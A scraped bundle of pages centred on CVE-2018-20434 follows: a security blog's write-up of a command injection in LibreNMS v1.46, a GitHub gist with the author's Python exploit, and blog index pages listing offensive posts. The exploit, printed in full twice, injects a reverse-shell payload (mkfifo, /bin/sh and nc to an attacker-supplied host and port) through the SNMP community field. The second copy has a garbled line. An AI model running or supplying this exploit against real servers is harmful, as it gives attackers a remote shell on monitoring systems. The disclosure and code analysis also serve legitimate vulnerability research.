=== Content from shells.systems_a59b9094_20250126_042752.html ===


Search for:

Search

[Skip to content](#content)

# [Shells.Systems](https://shells.systems/)

WE POP SHELLS

## [PandoraFMS v7.0NG.777.3 Remote Command Execution (CVE-2024-11320)](https://shells.systems/pandorafms-v7-0ng-777-3-remote-command-execution-cve-2024-11320/)

Posted on 2025-01-052025-01-05 by [Askar](https://shells.systems/author/askar/)

[![PandoraFMS v7.0NG.777.3 Remote Command Execution (CVE-2024-11320)](https://shells.systems/wp-content/uploads/2025/01/pandora-poc.png)](https://shells.systems/pandorafms-v7-0ng-777-3-remote-command-execution-cve-2024-11320/)

Estimated Reading Time:  9 minutes Previously, during a quick code review of PandoraFMS, I identified CVE-2019-20224, an RCE vulnerability affecting the product. In this blog post, I’ll delve into another code review of PandoraFMS that uncovered a new RCE vulnerability, now assigned CVE-2024-11320. This post is the first in a two-part series focused on CVE-2024-11320. In this part, I’ll walk…

Categories[AppSec](https://shells.systems/category/appsec/), [static code analysis](https://shells.systems/category/static-code-analysis/)

## [Extracting Plaintext Credentials from Palo Alto Global Protect](https://shells.systems/extracting-plaintext-credentials-from-palo-alto-global-protect/)

Posted on 2024-11-192024-11-19 by [Ian](https://shells.systems/author/ianl/)

[![Extracting Plaintext Credentials from Palo Alto Global Protect](https://shells.systems/wp-content/uploads/2024/11/image.png)](https://shells.systems/extracting-plaintext-credentials-from-palo-alto-global-protect/)

Estimated Reading Time:  5 minutes On a recent Red Team engagement, I was poking around having a look at different files and trying to see if I could extract any information that would allow me to move laterally through the network. I was hopeful, as always, that I would land on domain\_admin\_passwords\_2024.xlsx or something (don’t laugh – we’ve all found…

Categories[Red Team](https://shells.systems/category/red-team/), [Uncategorized](https://shells.systems/category/uncategorized/)

## [Cortex XDR Ransomware Protection, Chocolate Teapots and Inflatable Dartboards﻿](https://shells.systems/cortex-xdr-ransomware-protection-chocolate-teapots-and-inflatable-dartboards%EF%BB%BF/)

Posted on 2024-07-252024-08-05 by [Ian](https://shells.systems/author/ianl/)

[![Cortex XDR Ransomware Protection, Chocolate Teapots and Inflatable Dartboards﻿](https://shells.systems/wp-content/uploads/2024/07/Picture10-1.png)](https://shells.systems/cortex-xdr-ransomware-protection-chocolate-teapots-and-inflatable-dartboards%EF%BB%BF/)

Estimated Reading Time:  6 minutes A post exploring how to enumerate and avoid Cortex XDR ransomware files/folders and avoid getting caught

Categories[AppSec](https://shells.systems/category/appsec/), [Red Team](https://shells.systems/category/red-team/)

## [Froxlor v2.0.6 Remote Command Execution (CVE-2023-0315)](https://shells.systems/froxlor-v2-0-6-remote-command-execution-cve-2023-0315/)

Posted on 2023-01-292023-01-29 by [Askar](https://shells.systems/author/askar/)

[![Froxlor v2.0.6 Remote Command Execution (CVE-2023-0315)](https://shells.systems/wp-content/uploads/2023/01/froxlor-rce.png)](https://shells.systems/froxlor-v2-0-6-remote-command-execution-cve-2023-0315/)

Estimated Reading Time:  8 minutes Summary about Froxlor Froxlor is a web-based server management software for Linux-based operating systems. It is primarily used to manage web hosting environments and allows users to create and manage websites, email accounts, and FTP accounts. It also provides tools for monitoring server resources and managing backups. Froxlor is written in PHP and uses a…

Categories[AppSec](https://shells.systems/category/appsec/), [static code analysis](https://shells.systems/category/static-code-analysis/)

## [APT-HUNTER V3.0 : Rebuilt with Multiprocessing and new features](https://shells.systems/apt-hunter-v3-0-rebuilt-with-multiprocessing-and-new-cool-features/)

Posted on 2023-01-252023-01-29 by [Ahmed Khlief](https://shells.systems/author/ahmedkhlief/)

[![APT-HUNTER V3.0 : Rebuilt with Multiprocessing and new features](https://shells.systems/wp-content/uploads/2023/01/logo.png)](https://shells.systems/apt-hunter-v3-0-rebuilt-with-multiprocessing-and-new-cool-features/)

Estimated Reading Time:  2 minutes Since last release i was working on new features and to increase the processing speed for large number of windows event logs files so i rebuilt the tool to use multiprocessing and added more feature that will help you in your next investigation. Download from here : https://github.com/ahmedkhlief/APT-Hunter/releases/tag/V3.0 APT-HUNTER V3.0 Features New use cases based…

Categories[Purple Team](https://shells.systems/category/purple-team/)

## [Bypassing AppLocker by abusing HashInfo](https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/)

Posted on 2022-08-192024-07-25 by [Ian](https://shells.systems/author/ianl/)

[![Bypassing AppLocker by abusing HashInfo](https://shells.systems/wp-content/uploads/2022/08/image-13.png)](https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/)

Estimated Reading Time:  4 minutes This article is based mostly on the work of Grzegorz Tworek (@0gtweet) I recently saw this tweet from Grzegorz Tworek (@0gtweet – who if you aren’t following you really should be!) come across my timeline I had seen previous tweets referencing the AppLocker hash/signature cache and having a CPD day I thought I would take…

Categories[Red Team](https://shells.systems/category/red-team/)

## [Oh my API, abusing TYK cloud API management to hide your malicious C2 traffic](https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-your-malicious-c2-traffic/)

Posted on 2022-06-182022-06-19 by [Askar](https://shells.systems/author/askar/)

[![Oh my API, abusing TYK cloud API management to hide your malicious C2 traffic](https://shells.systems/wp-content/uploads/2022/06/TYK-CS-org.png)](https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-your-malicious-c2-traffic/)

Estimated Reading Time:  10 minutes Hiding your malicious C2 traffic through legitimate channels is challenging nowadays, especially while CDN providers block all known techniques to use domain fronting to hide your malicious traffic. For that reason, I was looking for a service that I can (ab)use to forward and hide my malicious C2 traffic using their domains without exposing my…

Categories[Red Team](https://shells.systems/category/red-team/)

## [NinjaC2 V2.2 Released with New Features](https://shells.systems/ninjac2-v2-2-released-with-new-features/)

Posted on 2022-04-092022-04-10 by [Ahmed Khlief](https://shells.systems/author/ahmedkhlief/)

[![NinjaC2 V2.2 Released with New Features](https://shells.systems/wp-content/uploads/2022/04/Screenshot-from-2022-04-10-21-31-01.png)](https://shells.systems/ninjac2-v2-2-released-with-new-features/)

Estimated Reading Time:  3 minutes NinjaC2 v2.2 include new features including : NinjaC2 can be downloaded from github Enhanced User interface New Amazon Web Services EC2 instance creation automation : deploy Ninja to new AWS instance in 5 minutes. More organized file management Now every campaign has its own folder that contain files and configuration. Updated Mimikatz script Fixes for…

Categories[Red Team](https://shells.systems/category/red-team/)

## [DNSStager v1.0 stable: Stealthier code, DLL agent & much more](https://shells.systems/dnsstager-v1-0-stable-stealthier-code-dll-agent-much-more/)

Posted on 2022-02-012022-02-01 by [Askar](https://shells.systems/author/askar/)

[![DNSStager v1.0 stable: Stealthier code, DLL agent & much more](https://shells.systems/wp-content/uploads/2022/02/DNSStagerWorking.png)](https://shells.systems/dnsstager-v1-0-stable-stealthier-code-dll-agent-much-more/)

Estimated Reading Time:  3 minutes In the past year, I published the first version of DNSStager which is a tool to hide your payload in DNS, and presented an updated version of it at BlackHat Europe 2021 and @Hack conferences. Today I’m happy to announce that the Stable version of DNSStager is out with some new features and fixes for…

Categories[Red Team](https://shells.systems/category/red-team/)

## [APT-Hunter V2.0 : More than 200 use cases and new features](https://shells.systems/apt-hunter-v2-0-more-than-200-use-cases-and-new-features/)

Posted on 2021-11-062022-04-10 by [Ahmed Khlief](https://shells.systems/author/ahmedkhlief/)

[![APT-Hunter V2.0 : More than 200 use cases and new features](https://shells.systems/wp-content/uploads/2021/11/Screenshot-from-2021-11-06-13-26-25.png)](https://shells.systems/apt-hunter-v2-0-more-than-200-use-cases-and-new-features/)

Estimated Reading Time:  5 minutes APT-Hunter first released at the beginning of 2021 and since the release, many use cases and features were added along with bug fixes . APT-Hunter V2.0 now includes more than 200 use cases , log hunting , new frequency analysis , very easy to use and analyze multiple devices logs at same time . Github…

Categories[Purple Team](https://shells.systems/category/purple-team/)

[Older posts →](https://shells.systems/page/2/)

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from gist.github.com_ee74baf4_20250124_232648.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F516df57aafd8c6e3a1d70765075d372d)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F516df57aafd8c6e3a1d70765075d372d&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F516df57aafd8c6e3a1d70765075d372d) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F516df57aafd8c6e3a1d70765075d372d&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@mhaskar](https://avatars.githubusercontent.com/u/6861215?s=64&v=4)](/mhaskar)

# [mhaskar](/mhaskar)/**[librenms-exploit.py](/mhaskar/516df57aafd8c6e3a1d70765075d372d)**

Last active
February 19, 2022 13:10

Show Gist options

* [Download ZIP](/mhaskar/516df57aafd8c6e3a1d70765075d372d/archive/60379f37f0992de25a24d7ca3eccefcebf7956a6.zip)

* [Star
  6
  (6)](/login?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F516df57aafd8c6e3a1d70765075d372d)You must be signed in to star a gist
* [Fork
  2
  (2)](/login?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F516df57aafd8c6e3a1d70765075d372d)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/mhaskar/516df57aafd8c6e3a1d70765075d372d.js&quot;&gt;&lt;/script&gt;
* Save mhaskar/516df57aafd8c6e3a1d70765075d372d to your computer and use it in GitHub Desktop.

[Code](/mhaskar/516df57aafd8c6e3a1d70765075d372d)
[Revisions
3](/mhaskar/516df57aafd8c6e3a1d70765075d372d/revisions)
[Stars
6](/mhaskar/516df57aafd8c6e3a1d70765075d372d/stargazers)
[Forks
2](/mhaskar/516df57aafd8c6e3a1d70765075d372d/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/mhaskar/516df57aafd8c6e3a1d70765075d372d.js&quot;&gt;&lt;/script&gt;

Save mhaskar/516df57aafd8c6e3a1d70765075d372d to your computer and use it in GitHub Desktop.

[Download ZIP](/mhaskar/516df57aafd8c6e3a1d70765075d372d/archive/60379f37f0992de25a24d7ca3eccefcebf7956a6.zip)

 [Raw](/mhaskar/516df57aafd8c6e3a1d70765075d372d/raw/60379f37f0992de25a24d7ca3eccefcebf7956a6/librenms-exploit.py)

[**librenms-exploit.py**](#file-librenms-exploit-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | #!/usr/bin/python |
| --- | --- |
|  |  |
|  | ''' |
|  | # Exploit Title: LibreNMS v1.46 authenticated Remote Code Execution |
|  | # Date: 24/12/2018 |
|  | # Exploit Author: Askar (@mohammadaskar2) |
|  | # CVE : CVE-2018-20434 |
|  | # Vendor Homepage: https://www.librenms.org/ |
|  | # Version: v1.46 |
|  | # Tested on: Ubuntu 18.04 / PHP 7.2.10 |
|  | ''' |
|  |  |
|  | import requests |
|  | from urllib import urlencode |
|  | import sys |
|  |  |
|  | if len(sys.argv) != 5: |
|  | print "[!] Usage : ./exploit.py http://www.example.com cookies rhost rport" |
|  | sys.exit(0) |
|  |  |
|  | # target (user input) |
|  | target = sys.argv[1] |
|  |  |
|  | # cookies (user input) |
|  | raw\_cookies = sys.argv[2] |
|  |  |
|  | # remote host to connect to |
|  | rhost = sys.argv[3] |
|  |  |
|  | # remote port to connect to |
|  | rport = sys.argv[4] |
|  |  |
|  | # hostname to use (change it if you want) |
|  | hostname = "dummydevice" |
|  |  |
|  | # payload to create reverse shell |
|  | payload = "'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f) #".format(rhost, rport) |
|  |  |
|  | # request headers |
|  | headers = { |
|  | "Content-Type": "application/x-www-form-urlencoded", |
|  | "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86\_64; rv:59.0) Gecko/20100101" |
|  | } |
|  |  |
|  | # request cookies |
|  | cookies = {} |
|  | for cookie in raw\_cookies.split(";"): |
|  | # print cookie |
|  | c = cookie.split("=") |
|  | cookies[c[0]] = c[1] |
|  |  |
|  |  |
|  | def create\_new\_device(url): |
|  | raw\_request = { |
|  | "hostname": hostname, |
|  | "snmp": "on", |
|  | "sysName": "", |
|  | "hardware": "", |
|  | "os": "", |
|  | "snmpver": "v2c", |
|  | "os\_id": "", |
|  | "port": "", |
|  | "transport": "udp", |
|  | "port\_assoc\_mode": "ifIndex", |
|  | "community": payload, |
|  | "authlevel": "noAuthNoPriv", |
|  | "authname": "", |
|  | "authpass": "", |
|  | "cryptopass": "", |
|  | "authalgo": "MD5", |
|  | "cryptoalgo": "AES", |
|  | "force\_add": "on", |
|  | "Submit": "" |
|  | } |
|  | full\_url = url + "/addhost/" |
|  | request\_body = urlencode(raw\_request) |
|  |  |
|  | # send the device creation request |
|  | request = requests.post( |
|  | full\_url, data=request\_body, cookies=cookies, headers=headers |
|  | ) |
|  | text = request.text |
|  | if "Device added" in text: |
|  | print "[+] Device Created Sucssfully" |
|  | return True |
|  | else: |
|  | print "[-] Cannot Create Device" |
|  | return False |
|  |  |
|  |  |
|  | def request\_exploit(url): |
|  | params = { |
|  | "id": "capture", |
|  | "format": "text", |
|  | "type": "snmpwalk", |
|  | "hostname": hostname |
|  | } |
|  |  |
|  | # send the payload call |
|  | request = requests.get(url + "/ajax\_output.php", |
|  | params=params, |
|  | headers=headers, |
|  | cookies=cookies |
|  | ) |
|  | text = request.text |
|  | if rhost in text: |
|  | print "[+] Done, check your nc !" |
|  |  |
|  |  |
|  | if create\_new\_device(target): |
|  | request\_exploit(target) |

[![@lifesfun101](https://avatars.githubusercontent.com/u/50033002?s=80&v=4)](/lifesfun101)

Copy link

### **[lifesfun101](/lifesfun101)** commented [Aug 20, 2019](/mhaskar/516df57aafd8c6e3a1d70765075d372d?permalink_comment_id=3002759#gistcomment-3002759)

For some reason device creates successfully but no reverse shell opens.

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fmhaskar%2F516df57aafd8c6e3a1d70765075d372d)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_743c0791_20250124_232642.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from shells.systems_5b32bdd3_20250124_232650.html ===


Search for:

Search

[Skip to content](#content)

[Shells.Systems](https://shells.systems/)

WE POP SHELLS

# LibreNMS v1.46 Remote Code Execution (CVE-2018-20434)

Posted on 2019-01-062019-06-30 by [Askar](https://shells.systems/author/askar/)

![](https://shells.systems/wp-content/uploads/2019/01/LNMS_capture_request.png)
Estimated Reading Time:  7 minutes
#### Summary about LibreNMS

LibreNMS is an open source, powerful and feature-rich auto-discovering PHP based network monitoring system which uses the SNMP protocol. It supports a broad range of operating systems including Linux, FreeBSD, as well as network devices including Cisco, Juniper, Brocade, Foundry, HP and many more.

#### About the exploit

The exploitation triggers by adding an arbitrary command in the public community parameter when adding a new device -which sends an unsanitized request to “addhost.inc.php” file, therefore any system execution to the injected request will result in a remote code execution. Calling “capture.inc.php” will grant us that behavior thru “popen” method, however you can access it by requesting “ajax\_output.php” that takes [file\_name].inc.php as a parameter.

The journey started when I was analyzing LibreNMS, I decided to hunt for remote command execution (RCE) in that project, I downloaded the source code and start searching for any unsafe functions the may lead to command execution such as (system, exec, shell, exec, popen, etc..) using a very simple [python script](https://github.com/mhaskar/RCEScanner) I wrote.

after running the script, I got TONS of results and after a couple of hours trying to understand the code and digging deeper into it, I found some interesting piece of code in html/includes/output/capture.inc.php line #67:

```

    if (($fp = popen($cmd, "r"))) {
        while (!feof($fp)) {
            $line = stream_get_line($fp, 1024, PHP_EOL);
            echo preg_replace('/\033\[[\d;]+m/', '', $line) . PHP_EOL;
            ob_flush();
            flush(); // you have to flush buffer
        }
        fclose($fp);
    }

```

So as we can see in line #67, the script will execute the $cmd value using popen function and return the result of executing the command stored in $cmd, we can take a look at the beginning of this file to see that it contains a switch statement that controls that $cmd value in line #36 and if the value of $type (which is a POST request declared in line #34 ) is equals to snmpwalk it will call the **gen\_snmpwalk\_cmd** function in line #44 as the following:

```

$type = $_REQUEST['type'];

switch ($type) {
    case 'poller':
        $cmd = "php ${config['install_dir']}/poller.php -h $hostname -r -f -d";
        $filename = "poller-$hostname.txt";
        break;
    case 'snmpwalk':
        $device = device_by_name(mres($hostname));

        $cmd = gen_snmpwalk_cmd($device, '.', ' -OUneb');

        if ($debug) {
            $cmd .= ' 2>&1';
        }

```

So apparently the capture.inc.php will handle some requests that control the snmp protocol that is passed by the user, we will discover that later in the article, but now lets focus on line #44 in capture.inc.php file which call the gen\_snmpwalk\_cmd function that is existed in includes/snmp.inc.php, and save it’s results to $cmd variable which will be passed to our **popen** in capture.inc.php line #67 and this function do the following:

```

function gen_snmp_cmd($cmd, $device, $oids, $options = null, $mib = null, $mibdir = null)
{
    global $debug;

    // populate timeout & retries values from configuration
    $timeout = prep_snmp_setting($device, 'timeout');
    $retries = prep_snmp_setting($device, 'retries');

    if (!isset($device['transport'])) {
        $device['transport'] = 'udp';
    }

    $cmd .= snmp_gen_auth($device);
    $cmd .= " $options";
    $cmd .= $mib ? " -m $mib" : '';
    $cmd .= mibdir($mibdir, $device);
    $cmd .= isset($timeout) ? " -t $timeout" : '';
    $cmd .= isset($retries) ? " -r $retries" : '';
    $cmd .= ' '.$device['transport'].':'.$device['hostname'].':'.$device['port'];
    $cmd .= " $oids";

    if (!$debug) {
        $cmd .= ' 2>/dev/null';
    }

    return $cmd;
} // end gen_snmp_cmd()

```

So in theory, if we can control the output that will be returned from the gen\_snmp\_cmd which will be passed to popen later on , we can gain a beautiful command execution, and after some digging in this function, I noticed the function calls another function called snmp\_gen\_auth which is existed in snmp.inc.php line #768 and do the following:

```

function snmp_gen_auth(&$device)
{
    global $debug, $vdebug;

    $cmd = '';

    if ($device['snmpver'] === 'v3') {
        $cmd = " -v3 -n '' -l '".$device['authlevel']."'";

        //add context if exist context
        if (key_exists('context_name', $device)) {
            $cmd = " -v3 -n '".$device['context_name']."' -l '".$device['authlevel']."'";
        }

        if (strtolower($device['authlevel']) === 'noauthnopriv') {
            // We have to provide a username anyway (see Net-SNMP doc)
            $username = !empty($device['authname']) ? $device['authname'] : 'root';
            $cmd .= " -u '".$username."'";
        } elseif (strtolower($device['authlevel']) === 'authnopriv') {
            $cmd .= " -a '".$device['authalgo']."'";
            $cmd .= " -A '".$device['authpass']."'";
            $cmd .= " -u '".$device['authname']."'";
        } elseif (strtolower($device['authlevel']) === 'authpriv') {
            $cmd .= " -a '".$device['authalgo']."'";
            $cmd .= " -A '".$device['authpass']."'";
            $cmd .= " -u '".$device['authname']."'";
            $cmd .= " -x '".$device['cryptoalgo']."'";
            $cmd .= " -X '".$device['cryptopass']."'";
        } else {
            if ($debug) {
                print 'DEBUG: '.$device['snmpver']." : Unsupported SNMPv3 AuthLevel (wtf have you done ?)\n";
            }
        }
    } elseif ($device['snmpver'] === 'v2c' or $device['snmpver'] === 'v1') {
        $cmd  = " -".$device['snmpver'];
        $cmd .= " -c '".$device['community']."'";
    } else {
        if ($debug) {
            print 'DEBUG: '.$device['snmpver']." : Unsupported SNMP Version (shouldn't be possible to get here)\n";
        }
    }//end if

    return $cmd;
}//end snmp_gen_auth()

```

After some digging in the code, I noticed that we can control most of the device information , the device id will be passed to the gen\_snmpwalk\_cmd function then to snmp\_gen\_auth function and finally all the device information will be fetched and returned to the $cmd variable which we want to control , So I decieded to find an way to control the snmp “community” variable and we will find how later on.

> And obviously, we can escape the input in line #803 and inject our command using this format ‘$(our\_command).

So as I mentioned, we need to find a place that allows us to control one of the device information which is the “SNMP community “, so I start digging in add new host feature in LibreNMS and I noticed that once you tried to add a new device to LibreNMS some of the user input are saved as one of the configuration value which will be fetched later on by our snmp\_gen\_auth function !

And for our great luck , Karma sent to us an unfiltered POST request that contains our community string which we can control ! take a look at this code in html/pages/addhost.inc.php line #52

```

        } elseif ($_POST['snmpver'] === 'v2c' || $_POST['snmpver'] === 'v1') {
            if ($_POST['community']) {
                $config['snmp']['community'] = array(clean($_POST['community'], false));
            }

```

In line #52 the script check if the entered snmp version is equal to v1 or v2c then in line #53 we can see that the script check if the $\_POST[‘community’] is passed in POST request to the application and add it to the snmp config in line #54, so we can know that we can confirm that we can control the community variable and try to inject an arbitrary commands after we pass the community request to it.

So, we will do the following in order to have a RCE:

```
1- Add new device and inject our arbitrary command in public community string. ==> that could be happen by sending a request to addhost.inc.php

2- Make a request to call the popen function which will get the command from some functions that will have our community string injected into it with our command ==> that could be happens by sending a request to capture.inc.php which will trigger the command execution

```

Now to add a new device , we need to send a request to /addhost page which will be handled by addhost.inc.php, and when we try to added from the web interface and intercept the request, we have the following:

![](https://shells.systems/wp-content/uploads/2019/01/LNMSbody_req1.png)

AddHost request

and to trigger the popen function “capture.inc.php” file, we need to send a request to /ajax\_output.php “located in html/ajax\_output.php” which will call the capture.inc.php using this code:

```

if (isset($_SESSION['stage']) && $_SESSION['stage'] == 2) {
    $init_modules = array('web', 'nodb');
    require realpath(__DIR__ . '/..') . '/includes/init.php';
} else {
    $init_modules = array('web', 'auth', 'alerts');
    require realpath(__DIR__ . '/..') . '/includes/init.php';

    if (!LegacyAuth::check()) {
        echo "Unauthenticated\n";
        exit;
    }
}

set_debug($_REQUEST['debug']);
$id = str_replace('/', '', $_REQUEST['id']);

if (isset($id)) {
    require $config['install_dir'] . "/html/includes/output/$id.inc.php";
}

```

If the $\_request[‘id’] was capture, it will call the capture.inc.php as highlighted in line #35, to call this file and send the request from the web interface we can use the link http://server/device/device=2/tab=capture/ ==> snmp ==> run, we can see the following request:

![](https://shells.systems/wp-content/uploads/2019/01/LNMS_capture_request.png)

As we can see , after send the request we should have a 200 OK response which means that the functions was mentioned before are called and we can see that we got our community string injected “test string” and now we can replace it with our payload to get a RCE !

> Note : you will not have the same result in the response because I just edited the code to print the command for debugging perposes and to show you that we can control the community string and injected it with “test string”.

So finally, to sum up all that , I wrote a python script to exploit this vulnerability and **POP A SHELL !**

```

#!/usr/bin/python

'''
# Exploit Title: LibreNMS v1.46 authenticated Remote Code Execution
# Date: 24/12/2018
# Exploit Author: Askar (@mohammadaskar2)
# CVE : CVE-2018-20434
# Vendor Homepage: https://www.librenms.org/
# Version: v1.46
# Tested on: Ubuntu 18.04 / PHP 7.2.10
'''

import requests
from urllib import urlencode
import sys

if len(sys.argv) != 5:
    print "[!] Usage : ./exploit.py http://www.example.com cookies rhost rport"
    sys.exit(0)

# target (user input)
target = sys.argv[1]

# cookies (user input)
raw_cookies = sys.argv[2]

# remote host to connect to
rhost = sys.argv[3]

# remote port to connect to
rport = sys.argv[4]

# hostname to use (change it if you want)
hostname = "dummydevice"

# payload to create reverse shell
payload = "'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f) #".format(rhost, rport)

# request headers
headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101"
    }

# request cookies
cookies = {}
for cookie in raw_cookies.split(";"):
    # print cookie
    c = cookie.split("=")
    cookies] = c[1]

def create_new_device(url):
    raw_request = {
        "hostname": hostname,
        "snmp": "on",
        "sysName": "",
        "hardware": "",
        "os": "",
        "snmpver": "v2c",
        "os_id": "",
        "port": "",
        "transport": "udp",
        "port_assoc_mode": "ifIndex",
        "community": payload,
        "authlevel": "noAuthNoPriv",
        "authname": "",
        "authpass": "",
        "cryptopass": "",
        "authalgo": "MD5",
        "cryptoalgo": "AES",
        "force_add": "on",
        "Submit": ""
    }
    full_url = url + "/addhost/"
    request_body = urlencode(raw_request)

    # send the device creation request
    request = requests.post(
        full_url, data=request_body, cookies=cookies, headers=headers
    )
    text = request.text
    if "Device added" in text:
        print "[+] Device Created Sucssfully"
        return True
    else:
        print "[-] Cannot Create Device"
        return False

def request_exploit(url):
    params = {
        "id": "capture",
        "format": "text",
        "type": "snmpwalk",
        "hostname": hostname
        }

    # send the payload call
    request = requests.get(url + "/ajax_output.php",
        params=params,
        headers=headers,
        cookies=cookies
        )
    text = request.text
    if rhost in text:
        print "[+] Done, check your nc !"

if create_new_device(target):
    request_exploit(target)

```

And you can get the full exploit code via [github](https://gist.github.com/mhaskar/516df57aafd8c6e3a1d70765075d372d)or via [exploit-db.](https://www.exploit-db.com/exploits/47044)

And finally , we popped a shell

![](https://shells.systems/wp-content/uploads/2019/01/LNMSshell.png)

Categories[static code analysis](https://shells.systems/category/static-code-analysis/)
![](https://secure.gravatar.com/avatar/d6fbc3936f8273307f861bc80d82b490?s=72&d=mm&r=g)

[Askar](https://shells.systems/author/askar/ "Posts by Askar")

I write codes that break codes, Hacker wannabe.

## Post navigation

[NextNext post: Bypassing Kaspersky Endpoint and Cloud SandBox (real world pentest case)](https://shells.systems/bypassing-kaspersky-endpoint-and-cloud-sandbox-real-world-pentest-case/)

### Leave a Reply [Cancel reply](/librenms-v1-46-remote-code-execution-cve-2018-20434/#respond)

Your email address will not be published. Required fields are marked \*

Comment

Name \*

Email \*

Website

Δ

[Proudly powered by WordPress](https://wordpress.org/)



=== Content from drive.google.com_9526454b_20250124_232646.html ===

# Sign in

to continue to Google DriveEmail or phoneForgot email?![CAPTCHA image of text used to distinguish humans from robots]()Type the text you hear or seeNot your computer? Use Guest mode to sign in privately. [Learn more about using Guest mode](https://support.google.com/chrome/answer/6130773?hl=en-US)NextCreate account

=== Content from shells.systems_34a8bce5_20250126_042751.html ===


Search for:

Search

[Skip to content](#content)

[Shells.Systems](https://shells.systems/)

WE POP SHELLS

# Author: Askar

I write codes that break codes, Hacker wannabe.
## [PandoraFMS v7.0NG.777.3 Remote Command Execution (CVE-2024-11320)](https://shells.systems/pandorafms-v7-0ng-777-3-remote-command-execution-cve-2024-11320/)

Posted on 2025-01-052025-01-05 by [Askar](https://shells.systems/author/askar/)

[![PandoraFMS v7.0NG.777.3 Remote Command Execution (CVE-2024-11320)](https://shells.systems/wp-content/uploads/2025/01/pandora-poc.png)](https://shells.systems/pandorafms-v7-0ng-777-3-remote-command-execution-cve-2024-11320/)

Estimated Reading Time:  9 minutes Previously, during a quick code review of PandoraFMS, I identified CVE-2019-20224, an RCE vulnerability affecting the product. In this blog post, I’ll delve into another code review of PandoraFMS that uncovered a new RCE vulnerability, now assigned CVE-2024-11320. This post is the first in a two-part series focused on CVE-2024-11320. In this part, I’ll walk…

Categories[AppSec](https://shells.systems/category/appsec/), [static code analysis](https://shells.systems/category/static-code-analysis/)

## [Froxlor v2.0.6 Remote Command Execution (CVE-2023-0315)](https://shells.systems/froxlor-v2-0-6-remote-command-execution-cve-2023-0315/)

Posted on 2023-01-292023-01-29 by [Askar](https://shells.systems/author/askar/)

[![Froxlor v2.0.6 Remote Command Execution (CVE-2023-0315)](https://shells.systems/wp-content/uploads/2023/01/froxlor-rce.png)](https://shells.systems/froxlor-v2-0-6-remote-command-execution-cve-2023-0315/)

Estimated Reading Time:  8 minutes Summary about Froxlor Froxlor is a web-based server management software for Linux-based operating systems. It is primarily used to manage web hosting environments and allows users to create and manage websites, email accounts, and FTP accounts. It also provides tools for monitoring server resources and managing backups. Froxlor is written in PHP and uses a…

Categories[AppSec](https://shells.systems/category/appsec/), [static code analysis](https://shells.systems/category/static-code-analysis/)

## [Oh my API, abusing TYK cloud API management to hide your malicious C2 traffic](https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-your-malicious-c2-traffic/)

Posted on 2022-06-182022-06-19 by [Askar](https://shells.systems/author/askar/)

[![Oh my API, abusing TYK cloud API management to hide your malicious C2 traffic](https://shells.systems/wp-content/uploads/2022/06/TYK-CS-org.png)](https://shells.systems/oh-my-api-abusing-tyk-cloud-api-management-service-to-hide-your-malicious-c2-traffic/)

Estimated Reading Time:  10 minutes Hiding your malicious C2 traffic through legitimate channels is challenging nowadays, especially while CDN providers block all known techniques to use domain fronting to hide your malicious traffic. For that reason, I was looking for a service that I can (ab)use to forward and hide my malicious C2 traffic using their domains without exposing my…

Categories[Red Team](https://shells.systems/category/red-team/)

